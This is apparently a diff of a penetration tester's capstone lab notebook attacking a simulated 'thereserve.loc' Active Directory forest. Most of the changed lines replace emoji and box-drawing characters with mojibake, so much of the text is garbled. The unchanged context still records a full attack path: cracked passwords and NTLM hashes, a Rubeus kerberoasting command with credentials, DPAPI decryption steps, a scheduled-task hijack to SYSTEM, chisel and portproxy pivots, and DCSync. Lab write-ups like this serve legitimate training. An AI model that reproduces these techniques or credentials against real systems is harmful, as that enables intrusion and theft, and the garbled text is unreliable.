 Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-05 00:23 GMT
 Nmap scan report for redcap21.csaw (10.200.40.21)
 Host is up (0.67s latency).
@@ -6378,7 +6380,7 @@ Compromised Accounts Summary
 
 | Account        | Source         | Credential               | Access Level              | Status             |
 | -------------- | -------------- | ------------------------ | ------------------------- | ------------------ |
-| THMSetup       | PS History     | `7Jv7qPvdZcvxzLPWrdmpuS` | Domain User + Local Admin | âœ… Recovered        |
+| THMSetup       | PS History     | `7Jv7qPvdZcvxzLPWrdmpuS` | Domain User + Local Admin | Ã¢Å“â€¦ Recovered        |
 | ashley.chan    | Scheduled Task | Pending LSA dump         | Domain User               | -  [ ]  Extracting |
 | keith.allen    | Scheduled Task | Pending LSA dump         | Domain User               | -  [ ]  Extracting |
 | mohammad.ahmed | Scheduled Task | Pending LSA dump         | Domain User               | -  [ ]  Extracting |
@@ -6811,9 +6813,9 @@ Phishbot Scripts Hardcoded Credentials
 | Account                              | Password       | Source                       | New to me               |
 | ------------------------------------ | -------------- | ---------------------------- | ----------------------- |
 | `ashley.chan@corp.thereserve.loc`    | `Fzjh7463^`    | `scripts/script_ashley.py`   | No (already in my list) |
-| `keith.allen@corp.thereserve.loc`    | `Password123!` | `scripts/script_keith.py`    | âœ… Yes (confirm)         |
+| `keith.allen@corp.thereserve.loc`    | `Password123!` | `scripts/script_keith.py`    | Ã¢Å“â€¦ Yes (confirm)         |
 | `mohammad.ahmed@corp.thereserve.loc` | `Password1!`   | `scripts/script_mohammad.py` | No (already in my list) |
-| `roy.sims@corp.thereserve.loc`       | `Fzjh7463&`    | `scripts/script_roy.py`      | âœ… Yes (confirm)         |
+| `roy.sims@corp.thereserve.loc`       | `Fzjh7463&`    | `scripts/script_roy.py`      | Ã¢Å“â€¦ Yes (confirm)         |
 
 > [!important] Notes
 > - `keith.allen@corp.thereserve.loc : Password123!` is the key new credential to validate first.
@@ -7103,15 +7105,15 @@ DPAPI and Other Crypto Artifacts
 
 | User             | Password Known             | Chrome Data | Masterkey Collected |
 | ---------------- | -------------------------- | ----------- | ------------------- |
-| Administrator    | ❌ (hash uncracked)         | ✅           | ✅                   |
-| ashley.chan (me) | âœ… `Fzjh7463^`              | âœ…           | âœ…                   |
-| keith.allen      | ✅ `Password123!`           | ✅           | ❌                   |
-| laura.wood       | ✅ `Password1@`             | ✅           | ❌                   |
-| melanie.barry    | ✅ `Password!`              | ✅           | ❌                   |
-| mohammad.ahmed   | ✅ `Password1!`             | ✅           | ❌                   |
-| oliver.williams  | ✅ `P@ssw0rd`               | ✅           | ❌                   |
-| roy.sims         | ✅ `Fzjh7463&`              | ✅           | ❌                   |
-| THMSetup         | ✅ `7Jv7qPvdZcvxzLPWrdmpuS` | ✅           | ❌                   |
+| Administrator    | âŒ (hash uncracked)         | âœ…           | âœ…                   |
+| ashley.chan (me) | Ã¢Å“â€¦ `Fzjh7463^`              | Ã¢Å“â€¦           | Ã¢Å“â€¦                   |
+| keith.allen      | âœ… `Password123!`           | âœ…           | âŒ                   |
+| laura.wood       | âœ… `Password1@`             | âœ…           | âŒ                   |
+| melanie.barry    | âœ… `Password!`              | âœ…           | âŒ                   |
+| mohammad.ahmed   | âœ… `Password1!`             | âœ…           | âŒ                   |
+| oliver.williams  | âœ… `P@ssw0rd`               | âœ…           | âŒ                   |
+| roy.sims         | âœ… `Fzjh7463&`              | âœ…           | âŒ                   |
+| THMSetup         | âœ… `7Jv7qPvdZcvxzLPWrdmpuS` | âœ…           | âŒ                   |
 
 > [!tip]- DPAPI Decryption Workflow (if pursued later)
 > 1. Decrypt masterkey using user password: `pypykatz dpapi masterkey <file> --password <pass>`
@@ -7457,8 +7459,8 @@ This completely changed my understanding of the environment. Here's how the fore
 
 ```
 thereserve.loc (Forest Root)
-├── corp.thereserve.loc (I'm here on WRK2)
-└── bank.thereserve.loc (likely final objective)
+â”œâ”€â”€ corp.thereserve.loc (I'm here on WRK2)
+â””â”€â”€ bank.thereserve.loc (likely final objective)
 ```
 
 
@@ -7489,7 +7491,7 @@ The BANK domain being separate suggests organizational segmentation for:
 Based on the capstone objectives mentioning "banking application", I'm betting the final flag is somewhere in the BANK domain. My attack path needs to be:
 
 ```
-Current State â†’ CORP Domain Admin â†’ Forest Root Access â†’ BANK Domain Access â†’ Banking Application
+Current State Ã¢â€ â€™ CORP Domain Admin Ã¢â€ â€™ Forest Root Access Ã¢â€ â€™ BANK Domain Access Ã¢â€ â€™ Banking Application
 ```
 
 
@@ -7817,8 +7819,8 @@ NETWORK TOPOLOGY
 **Forest Structure:**
 ```
 thereserve.loc (Forest Root)
-├── corp.thereserve.loc (CURRENT POSITION)
-└── bank.thereserve.loc (FINAL OBJECTIVE - banking application)
+â”œâ”€â”€ corp.thereserve.loc (CURRENT POSITION)
+â””â”€â”€ bank.thereserve.loc (FINAL OBJECTIVE - banking application)
 ```
 
 **---**
@@ -7937,9 +7939,9 @@ Administrator
 ### Current Position
 
 Active Access
-- **âœ… RDP session on WRK2 as THMSetup (local admin, NOT domain account)**
-- **âœ… Domain user credentials (roy.sims and 13+ others)**
-- **âœ… FULLSYNC scheduled task hijacked (runs as SYSTEM every 5 minutes on WRK2)**
+- **Ã¢Å“â€¦ RDP session on WRK2 as THMSetup (local admin, NOT domain account)**
+- **Ã¢Å“â€¦ Domain user credentials (roy.sims and 13+ others)**
+- **Ã¢Å“â€¦ FULLSYNC scheduled task hijacked (runs as SYSTEM every 5 minutes on WRK2)**
 
 Completed Actions
 1. Initial compromise: Exploited writable FULLSYNC scheduled task on WRK2
@@ -7948,13 +7950,13 @@ Completed Actions
 4. Kerberoasting: Successfully extracted TGS hashes for 5 service accounts using Rubeus
 
 Failed Attempts (Lessons Learned)
-- ❌ Mimikatz LSASS dump - x86 version staged instead of x64, resulted in "cannot access x64 process" error
-- ❌ PSRemoting with domain credentials - WinRM disabled/restricted on WRK2, all `Invoke-Command` attempts failed
-- ❌ BloodHound collection via PSRemoting - Same WinRM restriction blocked SharpHound execution
+- âŒ Mimikatz LSASS dump - x86 version staged instead of x64, resulted in "cannot access x64 process" error
+- âŒ PSRemoting with domain credentials - WinRM disabled/restricted on WRK2, all `Invoke-Command` attempts failed
+- âŒ BloodHound collection via PSRemoting - Same WinRM restriction blocked SharpHound execution
 
 Successful Workaround
-- **âœ… Rubeus executed with direct domain credentials using `/creduser` and `/credpassword` flags (no PSRemoting needed)**
-- **âœ… Command format that worked:**
+- **Ã¢Å“â€¦ Rubeus executed with direct domain credentials using `/creduser` and `/credpassword` flags (no PSRemoting needed)**
+- **Ã¢Å“â€¦ Command format that worked:**
 ```powershell
 .\Rubeus.exe kerberoast /user:svcOctober /domain:corp.thereserve.loc /dc:CORPDC.corp.thereserve.loc /creduser:CORP\roy.sims /credpassword:"Fzjh7463&" /outfile:svcOctober.txt /format:hashcat /nowrap
 ```
@@ -8164,14 +8166,14 @@ Privilege Escalation Paths (Expected)
 TOOLS STAGED
 
 **WRK2 (C:\Temp\Phase1\):**
-- âœ… Rubeus.exe (417k)
-- âœ… mimikatz.exe (1.1M x86 - WRONG VERSION)
-- âœ… SharpHound.exe (1.1M)
+- Ã¢Å“â€¦ Rubeus.exe (417k)
+- Ã¢Å“â€¦ mimikatz.exe (1.1M x86 - WRONG VERSION)
+- Ã¢Å“â€¦ SharpHound.exe (1.1M)
 
 **Kali VM (/media/sf_shared/CSAW/sessions/redcap22/WRK2_Phase1/tools/):**
-- âœ… Rubeus.exe
-- âœ… mimikatz.exe (x86)
-- âœ… SharpHound.exe
+- Ã¢Å“â€¦ Rubeus.exe
+- Ã¢Å“â€¦ mimikatz.exe (x86)
+- Ã¢Å“â€¦ SharpHound.exe
 
 > [!fail] Tools failing out again
 > Maybe priv level, maybe defender?
@@ -8384,7 +8386,7 @@ Credential Spray Analysis
 Reminder, loop back to WRK1 later
 
 > [!note] Reminder to self
-> I’m deliberately staying focused on WRK2 cracking and validation first.
+> Iâ€™m deliberately staying focused on WRK2 cracking and validation first.
 > Once I get new creds or an escalated account out of WRK2, I can circle back and re test WRK1 with better leverage.
 
 ---
@@ -8426,21 +8428,21 @@ Proof 2, SMB authentication works but admin shares are read only
 
 ---
 
-Key findings I’m carrying forward
+Key findings Iâ€™m carrying forward
 
-1. âœ… **`keith.allen` authenticates to WRK1 and WRK2**
+1. Ã¢Å“â€¦ **`keith.allen` authenticates to WRK1 and WRK2**
    Domain creds are valid and reusable.
 
-2. ❌ **SAM dump attempts gave nothing useful**
+2. âŒ **SAM dump attempts gave nothing useful**
    No output is the story, it matches a lack of local admin rights.
 
-3. ❌ **Remote execution is still blocked**
+3. âŒ **Remote execution is still blocked**
    PSExec, WMI style execution paths kept dying with `rpc_s_access_denied`.
 
-4. ❌ **Tier 0 passwords are not matching the obvious patterns**
+4. âŒ **Tier 0 passwords are not matching the obvious patterns**
    Nothing easy fell out of the first pass.
 
-5. âœ… **`adrian` is a real account and looks actionable**
+5. Ã¢Å“â€¦ **`adrian` is a real account and looks actionable**
    On WRK2 it shows as `PASSWORD_EXPIRED`, which is worth chasing.
 
 ---
@@ -8469,7 +8471,7 @@ Parking lot, the password reset web UI
 Quick environmental sanity check
 
 > [!example] Evidence, gateway service exposure check
-> This was me sanity checking if the gateway looked like a DC shaped surface. It doesn’t.
+> This was me sanity checking if the gateway looked like a DC shaped surface. It doesnâ€™t.
 >
 > ```php
 > === Check what's listening on 10.150.40.1 (capstone gateway) ===
@@ -9533,8 +9535,8 @@ I tested whether my current credential (`CORP\svcScanning`) could pivot directly
 What I found
 
 > [!warning] Probe Results Analysis
-> **Network:** âœ… All ports reachable (DNS, Kerberos, LDAP, SMB, RDP, WinRM)  
-> **Authentication:** ❌ Both SMB and WinRM denied with `Access is denied`
+> **Network:** Ã¢Å“â€¦ All ports reachable (DNS, Kerberos, LDAP, SMB, RDP, WinRM)  
+> **Authentication:** âŒ Both SMB and WinRM denied with `Access is denied`
 
 | Record | Value |
 |---|---|
@@ -11590,7 +11592,7 @@ Full Table of Extracted Results GREP'd for value:
 | 1983 | `svcBackups`           | `7c06472567acc2680dc9c5ce2f2eb7a9`     | Service account, Non first.last naming            |
 | 1984 | `svcEDR`               | `b34bc5ea6692fefc6eaf11847b145dba`     | Service account, Non first.last naming            |
 | 1985 | `svcMonitor`           | `3499efbddd3c1bcbf92a9f985f138aa4`     | Service account, Non first.last naming            |
-| 1986 | ~~`svcScanning`~~      | ~~`7facdc498ed1680c4fd1448319a8c04f`~~ | âœ… `Password1!` ? Service account, cracked earlier |
+| 1986 | ~~`svcScanning`~~      | ~~`7facdc498ed1680c4fd1448319a8c04f`~~ | Ã¢Å“â€¦ `Password1!` ? Service account, cracked earlier |
 | 1987 | `svcOctober`           | `9e556d75ba03c38c410d3a171e63711f`     | Service account, Non first.last naming            |
 | 1009 | `CORPDC$`              | `83457b7f52ef4fdaf9a850b0e2d64579`     | Machine account, Non first.last naming            |
 | 1112 | `THERESERVE$`          | `86d4370bed815a0ea3453439cd6756fc`     | Machine account, Non first.last naming            |
@@ -11599,10 +11601,10 @@ Full Table of Extracted Results GREP'd for value:
 | 1115 | `WRK1$`                | `c812b544b4423e7c00eb9d0cad14d7f2`     | Machine account, Non first.last naming            |
 | 1116 | `WRK2$`                | `bd4499e56e425688eb5a3f1fe022f6f1`     | Machine account, Non first.last naming            |
 | 2610 | `sshd`                 | `5876317a48de72cb17f38f49c5b06581`     | Non first.last naming                             |
-| 1622 | ~~`marc.smith1`~~      | ~~`fab1f3fef8c2e43a3017ae1573963285`~~ | âœ… `Tournament1971` ? Non first.last naming        |
-| 1815 | ~~`shane.robinson1`~~  | ~~`8091fee1f3890584904bd7d5cea1240e`~~ | âœ… `Changeme123` ? Non first.last naming           |
-| 1884 | ~~`timothy.cook1`~~    | ~~`e19ccf75ee54e06b06a5907af13cef42`~~ | âœ… `P@ssw0rd` ? Non first.last naming              |
-| 1964 | ~~`howard.davies1`~~   | ~~`e19ccf75ee54e06b06a5907af13cef42`~~ | âœ… `P@ssw0rd` ? Non first.last naming              |
+| 1622 | ~~`marc.smith1`~~      | ~~`fab1f3fef8c2e43a3017ae1573963285`~~ | Ã¢Å“â€¦ `Tournament1971` ? Non first.last naming        |
+| 1815 | ~~`shane.robinson1`~~  | ~~`8091fee1f3890584904bd7d5cea1240e`~~ | Ã¢Å“â€¦ `Changeme123` ? Non first.last naming           |
+| 1884 | ~~`timothy.cook1`~~    | ~~`e19ccf75ee54e06b06a5907af13cef42`~~ | Ã¢Å“â€¦ `P@ssw0rd` ? Non first.last naming              |
+| 1964 | ~~`howard.davies1`~~   | ~~`e19ccf75ee54e06b06a5907af13cef42`~~ | Ã¢Å“â€¦ `P@ssw0rd` ? Non first.last naming              |
 | 1144 | `t1_rachel.marsh`      | `397b7631a95826472d6c4f39dec11027`     | Tier 1                                            |
 | 1256 | `t1_nicholas.jackson`  | `30ac4feae69847f3f6ebc89f171ab0da`     | Tier 1                                            |
 | 1329 | `t1_heather.powell`    | `127ddeeadce53090a9321bd9cb88034f`     | Tier 1                                            |
@@ -11665,8 +11667,8 @@ Revised additions to hashes I want to crack
 
 |      RID | Account               | NTLM Hash                              | Notes                                                  |
 | -------: | --------------------- | -------------------------------------- | ------------------------------------------------------ |
-| ~~2002~~ | ~~`aimee.walker`~~    | ~~`fc525c9683e8fe067095ba2ddc971889`~~ | âœ…Lead Web Developer `Passw0rd!`                        |
-| ~~2003~~ | ~~`patrick.edwards`~~ | ~~`e19ccf75ee54e06b06a5907af13cef42`~~ | âœ…Lead Web Developer ? same hash as `P@ssw0rd` accounts |
+| ~~2002~~ | ~~`aimee.walker`~~    | ~~`fc525c9683e8fe067095ba2ddc971889`~~ | Ã¢Å“â€¦Lead Web Developer `Passw0rd!`                        |
+| ~~2003~~ | ~~`patrick.edwards`~~ | ~~`e19ccf75ee54e06b06a5907af13cef42`~~ | Ã¢Å“â€¦Lead Web Developer ? same hash as `P@ssw0rd` accounts |
 |     1328 | `heather.powell`      | `ecd2fe8ed94975a434407964e51cddfc`     | Base user account                                      |
 |     1329 | `t1_heather.powell`   | `127ddeeadce53090a9321bd9cb88034f`     | Tier 1                                                 |
 |     1330 | `t0_heather.powell`   | `8fb9eb207b87c2ed42f1cdfe98ba733a`     | Tier 0 ? Domain Admin                                  |
@@ -12518,7 +12520,7 @@ CORPDC and Forest Recon and Discovery
 > [!note] Context
 > At this point I already had stable CORPDC access as `CORP\MdCoreSvc` (Domain Admin) via my relay path.
 >
-> The goal for this session was not to redo earlier work, but to capture the minimum high‑value checks that:
+> The goal for this session was not to redo earlier work, but to capture the minimum highâ€‘value checks that:
 > 1) confirm what the forest root is,
 > 2) confirm the real ROOTDC target IP, and
 > 3) prove which services are reachable from my CORPDC vantage point before I pivot into deeper forest enumeration.
@@ -12573,22 +12575,22 @@ Reachability summary (service inference)
 > [!example] Evidence: open ports (reachability) with likely service inference and controls ports to make sure I tooled it right.
 | Port | Likely service (inferred) | Probe note | Result |
 | ---: | --- | --- | :---: |
-| 53 | DNS | TCP connect only (no banner) | âœ… |
-| 88 | Kerberos | TCP connect only (no banner) | âœ… |
-| 135 | MS RPC Endpoint Mapper | TCP connect only (no banner) | âœ… |
-| 139 | NetBIOS Session Service | TCP connect only (no banner) | âœ… |
-| 389 | LDAP | TCP connect only (no banner) | âœ… |
-| 445 | Microsoft-DS (SMB over TCP) | TCP connect only (no banner) | âœ… |
-| 464 | Kerberos kpasswd | TCP connect only (no banner) | âœ… |
-| 593 | RPC over HTTP | TCP connect only (no banner) | âœ… |
-| 636 | LDAPS | TCP connect only (no banner) | âœ… |
-| 3268 | Global Catalog LDAP | TCP connect only (no banner) | âœ… |
-| 3269 | Global Catalog LDAPS | TCP connect only (no banner) | âœ… |
-| 3389 | RDP | TCP connect only (no banner) | âœ… |
-| 5985 | WinRM HTTP | TCP connect only (no banner) | âœ… |
-| 9389 | AD Web Services | TCP connect only (no banner) | âœ… |
-| 1 | Control (expected closed) | sanity control | ❌ |
-| 65000 | Control (expected closed) | sanity control | ❌ |
+| 53 | DNS | TCP connect only (no banner) | Ã¢Å“â€¦ |
+| 88 | Kerberos | TCP connect only (no banner) | Ã¢Å“â€¦ |
+| 135 | MS RPC Endpoint Mapper | TCP connect only (no banner) | Ã¢Å“â€¦ |
+| 139 | NetBIOS Session Service | TCP connect only (no banner) | Ã¢Å“â€¦ |
+| 389 | LDAP | TCP connect only (no banner) | Ã¢Å“â€¦ |
+| 445 | Microsoft-DS (SMB over TCP) | TCP connect only (no banner) | Ã¢Å“â€¦ |
+| 464 | Kerberos kpasswd | TCP connect only (no banner) | Ã¢Å“â€¦ |
+| 593 | RPC over HTTP | TCP connect only (no banner) | Ã¢Å“â€¦ |
+| 636 | LDAPS | TCP connect only (no banner) | Ã¢Å“â€¦ |
+| 3268 | Global Catalog LDAP | TCP connect only (no banner) | Ã¢Å“â€¦ |
+| 3269 | Global Catalog LDAPS | TCP connect only (no banner) | Ã¢Å“â€¦ |
+| 3389 | RDP | TCP connect only (no banner) | Ã¢Å“â€¦ |
+| 5985 | WinRM HTTP | TCP connect only (no banner) | Ã¢Å“â€¦ |
+| 9389 | AD Web Services | TCP connect only (no banner) | Ã¢Å“â€¦ |
+| 1 | Control (expected closed) | sanity control | âŒ |
+| 65000 | Control (expected closed) | sanity control | âŒ |
 
 > [!note] Interpretation
 > `TcpTestSucceeded=True` only proves the TCP handshake completed from CORPDC to that port on ROOTDC.
@@ -12648,7 +12650,7 @@ Where I go next (Forest recon focus)
 > At this point I had already confirmed reachability to ROOTDC services from CORPDC, but I had also confirmed a clear authorisation boundary:
 > - `\\ROOTDC\c$` returned `Access is denied.`
 >
-> The goal of this section was to enumerate *who actually holds* forest root privilege, and to identify high‑signal misconfigurations that could enable a pivot, while staying low-noise and evidence-friendly.
+> The goal of this section was to enumerate *who actually holds* forest root privilege, and to identify highâ€‘signal misconfigurations that could enable a pivot, while staying low-noise and evidence-friendly.
 
 ---
 
@@ -12915,7 +12917,7 @@ Summary: what I achieved in this session (high signal only)
 >   * Computers where bob/hulk have sessions or admin rights
 >   * Any constrained/unconstrained delegation exploitation opportunities (as per your preferred workflow)
 > 
-> ### 2) Decide the non‑golden-ticket route to ROOT control
+> ### 2) Decide the nonâ€‘golden-ticket route to ROOT control
 > 
 > Given the recon results, the likely "clean" routes are:
 > 
@@ -13839,7 +13841,7 @@ The double-hop design:
 ```
 Kali <??chisel??> WRK2 ??direct??> CORP hosts (SERVER1/2, CORPDC, ROOTDC)
                     ?
-                    └??> ROOTDC:relay_ports ??netsh portproxy??> BANKDC (.101)
+                    â””??> ROOTDC:relay_ports ??netsh portproxy??> BANKDC (.101)
                                                               ??> .51
                                                               ??> .61
 ```
@@ -13973,8 +13975,8 @@ Host Discovery
 |----|----------|--------|--------|
 | 10.200.40.101 | BANKDC | bank.thereserve.loc | PSSession `hostname` |
 | 10.200.40.61 | JMP | BANK | nbtstat from ROOTDC |
-| 10.200.40.51 | ├── | ├── | nbtstat no response, DNS failed |
-| 10.200.40.52 | ├── | ├── | ROOTDC arp only, not yet scanned |
+| 10.200.40.51 | â”œâ”€â”€ | â”œâ”€â”€ | nbtstat no response, DNS failed |
+| 10.200.40.52 | â”œâ”€â”€ | â”œâ”€â”€ | ROOTDC arp only, not yet scanned |
 
 ROOTDC ARP Table (reference)
 
@@ -13995,55 +13997,55 @@ Updated Network Topology
         CORP internal segment  10.200.40.0/24
   ??????????????????????????????????????????????????????????
                 |
-  ├── Workstations (Kali-reachable over VPN) ??????????????
+  â”œâ”€â”€ Workstations (Kali-reachable over VPN) ??????????????
                 |
-                +├── WRK1.corp.thereserve.loc       10.200.40.21   [CORP]
+                +â”œâ”€â”€ WRK1.corp.thereserve.loc       10.200.40.21   [CORP]
                 |     SSH 22, SMB 445, RDP 3389, WinRM 5985
                 |
-                +├── WRK2.corp.thereserve.loc       10.200.40.22   [CORP]
+                +â”œâ”€â”€ WRK2.corp.thereserve.loc       10.200.40.22   [CORP]
                 |     SSH 22, SMB 445, RDP 3389, WinRM 5985
-                |     ** Chisel pivot (â†’ Kali:9999, 20 reverse forwards)
+                |     ** Chisel pivot (Ã¢â€ â€™ Kali:9999, 20 reverse forwards)
                 |
-  ├── Servers (via WRK2 chisel) ???????????????????????????
+  â”œâ”€â”€ Servers (via WRK2 chisel) ???????????????????????????
                 |
-                +├── SERVER1.corp.thereserve.loc    10.200.40.31   [CORP]
+                +â”œâ”€â”€ SERVER1.corp.thereserve.loc    10.200.40.31   [CORP]
                 |     SSH 22, SMB 445, RDP 3389, WinRM 5985
                 |
-                +├── SERVER2.corp.thereserve.loc    10.200.40.32   [CORP]
+                +â”œâ”€â”€ SERVER2.corp.thereserve.loc    10.200.40.32   [CORP]
                 |     SSH 22, RDP 3389, WinRM 5985
                 |     SMB 445 not observed
                 |
-  ├── Domain Controllers (via WRK2 chisel) ????????????????
+  â”œâ”€â”€ Domain Controllers (via WRK2 chisel) ????????????????
                 |
-                +├── CORPDC.corp.thereserve.loc     10.200.40.102  [CORP]
+                +â”œâ”€â”€ CORPDC.corp.thereserve.loc     10.200.40.102  [CORP]
                 |     DNS 53, LDAP 389, SMB 445, RDP 3389, WinRM 5985
                 |
-                +├── ROOTDC.thereserve.loc          10.200.40.100  [THERESERVE]
+                +â”œâ”€â”€ ROOTDC.thereserve.loc          10.200.40.100  [THERESERVE]
                 |     DNS 53, LDAP 389, SMB 445, RDP 3389, WinRM 5985
-                |     ** netsh portproxy relay â†’ BANK segment
+                |     ** netsh portproxy relay Ã¢â€ â€™ BANK segment
                 |
-                +├── BANKDC.bank.thereserve.loc     10.200.40.101  [BANK]
+                +â”œâ”€â”€ BANKDC.bank.thereserve.loc     10.200.40.101  [BANK]
                 |     SMB 445, RDP 3389, WinRM 5985 (confirmed)
-                |     Auth: THERESERVE\MdCoreSvc ✓ | BANK\MdCoreSvc âœ—
-                |     Route: Kali â†’ WRK2 â†’ ROOTDC relay
+                |     Auth: THERESERVE\MdCoreSvc âœ“ | BANK\MdCoreSvc Ã¢Å“â€”
+                |     Route: Kali Ã¢â€ â€™ WRK2 Ã¢â€ â€™ ROOTDC relay
                 |
-  ├── BANK Segment (via ROOTDC relay, auth TBD) ??????????
+  â”œâ”€â”€ BANK Segment (via ROOTDC relay, auth TBD) ??????????
                 |
-                +├── ├──                            10.200.40.51   [???]
+                +â”œâ”€â”€ â”œâ”€â”€                            10.200.40.51   [???]
                 |     RDP 3389, WinRM 5985, SMB 445 (open, auth denied)
                 |
-                +├── ├──                            10.200.40.52   [???]
+                +â”œâ”€â”€ â”œâ”€â”€                            10.200.40.52   [???]
                 |     ROOTDC arp only : no chisel/portproxy yet
                 |
-                +├── JMP.bank.thereserve.loc        10.200.40.61   [BANK]
+                +â”œâ”€â”€ JMP.bank.thereserve.loc        10.200.40.61   [BANK]
                 |     RDP 3389, WinRM 5985, SMB 445 (open, auth denied)
                 |
-  ├── Infrastructure ??????????????????????????????????????
+  â”œâ”€â”€ Infrastructure ??????????????????????????????????????
                 |
-                +├── DNS endpoint                   10.200.40.2
+                +â”œâ”€â”€ DNS endpoint                   10.200.40.2
                 |     DNS 53
                 |
-                +├── SSH endpoint                   10.200.40.250
+                +â”œâ”€â”€ SSH endpoint                   10.200.40.250
                       SSH 22
 ```
 
@@ -14071,7 +14073,7 @@ $my_ip         : 10.150.40.4
 $hostname      : BANKDC.bank.thereserve.loc
 $domain        : bank.thereserve.loc
 $creds         : THERESERVE\MdCoreSvc / l337Password!
-$relay_route   : Kali:15989 â†’ WRK2 â†’ ROOTDC:15989 â†’ BANKDC:5985
+$relay_route   : Kali:15989 Ã¢â€ â€™ WRK2 Ã¢â€ â€™ ROOTDC:15989 Ã¢â€ â€™ BANKDC:5985
 =========================================================
 ```
 
@@ -14265,22 +14267,22 @@ Updated Network Map
 
 ```
 thereserve.loc  (Forest Root)
-  ├── corp.thereserve.loc   (CORP child)
-  │     ├── WRK1    10.200.40.21   [CORP]  SSH, SMB, RDP, WinRM
-  │     ├── WRK2    10.200.40.22   [CORP]  SSH, SMB, RDP, WinRM  ← chisel pivot
-  │     ├── SERVER1 10.200.40.31   [CORP]  SSH, SMB, RDP, WinRM
-  │     ├── SERVER2 10.200.40.32   [CORP]  SSH, RDP, WinRM
-  │     └── CORPDC  10.200.40.102  [CORP]  DC — DCSync completed ✓
+  â”œâ”€â”€ corp.thereserve.loc   (CORP child)
+  â”‚     â”œâ”€â”€ WRK1    10.200.40.21   [CORP]  SSH, SMB, RDP, WinRM
+  â”‚     â”œâ”€â”€ WRK2    10.200.40.22   [CORP]  SSH, SMB, RDP, WinRM  â† chisel pivot
+  â”‚     â”œâ”€â”€ SERVER1 10.200.40.31   [CORP]  SSH, SMB, RDP, WinRM
+  â”‚     â”œâ”€â”€ SERVER2 10.200.40.32   [CORP]  SSH, RDP, WinRM
+  â”‚     â””â”€â”€ CORPDC  10.200.40.102  [CORP]  DC â€” DCSync completed âœ“
   ?
-  └── bank.thereserve.loc   (BANK child)
-        ├── BANKDC  10.200.40.101  [BANK]  DC — enumerated ✓
-        ├── WORK1   10.200.40.51   [BANK]  auth pending
-        ├── WORK2   10.200.40.52   [BANK]  auth pending
-        ├── JMP     10.200.40.61   [BANK]  auth pending — likely swift pivot point
-        ├── example 10.200.40.200  [???]   non-domain, role unknown
-        └── swift   10.200.40.201  [???]   non-domain — PRIMARY TARGET
+  â””â”€â”€ bank.thereserve.loc   (BANK child)
+        â”œâ”€â”€ BANKDC  10.200.40.101  [BANK]  DC â€” enumerated âœ“
+        â”œâ”€â”€ WORK1   10.200.40.51   [BANK]  auth pending
+        â”œâ”€â”€ WORK2   10.200.40.52   [BANK]  auth pending
+        â”œâ”€â”€ JMP     10.200.40.61   [BANK]  auth pending â€” likely swift pivot point
+        â”œâ”€â”€ example 10.200.40.200  [???]   non-domain, role unknown
+        â””â”€â”€ swift   10.200.40.201  [???]   non-domain â€” PRIMARY TARGET
 
-ROOTDC  10.200.40.100  [THERESERVE]  Forest root DC — netsh relay host
+ROOTDC  10.200.40.100  [THERESERVE]  Forest root DC â€” netsh relay host
 ```
 
 ---
@@ -14620,7 +14622,7 @@ CORP internal segment 10.200.40.0/24
 | Domain Controllers |  
 | - CORPDC.corp.thereserve.loc 10.200.40.102 [CORP] |  
 | DNS 53 LDAP 389 SMB 445 RDP 3389 WinRM 5985 |  
-| DCSync completed ✓ |  
+| DCSync completed âœ“ |  
 | |  
 | - ROOTDC.thereserve.loc 10.200.40.100 [THERESERVE] |  
 | DNS 53 LDAP 389 SMB 445 RDP 3389 WinRM 5985 |  
@@ -14632,7 +14634,7 @@ CORP internal segment 10.200.40.0/24
 | |  
 | BANKDC.bank.thereserve.loc 10.200.40.101 [BANK] |  
 | - SMB 445 RDP 3389 WinRM 5985 (confirmed) |  
-| - Auth: THERESERVE\\MdCoreSvc ✓ | BANK\\MdCoreSvc âœ— |  
+| - Auth: THERESERVE\\MdCoreSvc âœ“ | BANK\\MdCoreSvc Ã¢Å“â€” |  
 | |  
 | WORK1 (unknown fqdn) 10.200.40.51 [BANK/?] |  
 | - RDP 3389 WinRM 5985 SMB 445 (open, auth denied) |  
@@ -14664,11 +14666,11 @@ thereserve.loc (Forest Root)
 | +-- WRK2 10.200.40.22 [CORP] SSH, SMB, RDP, WinRM <- chisel pivot  
 | +-- SERVER1 10.200.40.31 [CORP] SSH, SMB, RDP, WinRM  
 | +-- SERVER2 10.200.40.32 [CORP] SSH, RDP, WinRM  
-| +-- CORPDC 10.200.40.102 [CORP] DC, DCSync completed ✓  
+| +-- CORPDC 10.200.40.102 [CORP] DC, DCSync completed âœ“  
 |  
 +-- bank.thereserve.loc (BANK child)  
 |  
-+-- BANKDC 10.200.40.101 [BANK] DC, enumerated ✓  
++-- BANKDC 10.200.40.101 [BANK] DC, enumerated âœ“  
 +-- WORK1 10.200.40.51 [BANK] auth pending  
 +-- WORK2 10.200.40.52 [BANK] auth pending  
 +-- JMP 10.200.40.61 [BANK] auth pending  
@@ -16075,8 +16077,8 @@ The portal presents a menu system. For Flag 1, the path was:
 
 ```
 [1] Submit proof of compromise
-  â†’ [1] Perimeter Breach
-    â†’ Hostname: wrk2
+  Ã¢â€ â€™ [1] Perimeter Breach
+    Ã¢â€ â€™ Hostname: wrk2
 ```
 
 > [!note] Flag Menu (full list captured for reference)
@@ -16265,7 +16267,7 @@ Set-Content C:\Windows\Temp\Triage.txt "1df3c3be-4ff5-4471-b4d0-56a8061b827a"
 bash
 
 ```bash
-# Kali — after clicking proceed
+# Kali â€” after clicking proceed
 curl -s "imap://10.200.40.11:143/INBOX;UID=8" --user "$mail_user:$mail_pass"
 ```
 
@@ -16295,7 +16297,7 @@ Set-Content C:\Users\Administrator\Triage.txt "852fea96-e878-4692-93e7-5445e5dd1
 bash
 
 ```bash
-# Kali — after clicking proceed
+# Kali â€” after clicking proceed
 curl -s "imap://10.200.40.11:143/INBOX;UID=10" --user "$mail_user:$mail_pass"
 ```
 
@@ -16325,7 +16327,7 @@ Set-Content C:\Windows\Temp\Triage.txt "994993f9-9ef3-4c8f-9503-0c08f606d738"
 bash
 
 ```bash
-# Kali — after clicking proceed
+# Kali â€” after clicking proceed
 curl -s "imap://10.200.40.11:143/INBOX;UID=12" --user "$mail_user:$mail_pass"
 ```
 
@@ -16353,7 +16355,7 @@ Set-Content C:\Users\Administrator\Triage.txt "c68e234a-3019-49df-8e10-2b6f68c5b
 bash
 
 ```bash
-# Kali — after clicking proceed
+# Kali â€” after clicking proceed
 curl -s "imap://10.200.40.11:143/INBOX;UID=14" --user "$mail_user:$mail_pass"
 ```
 
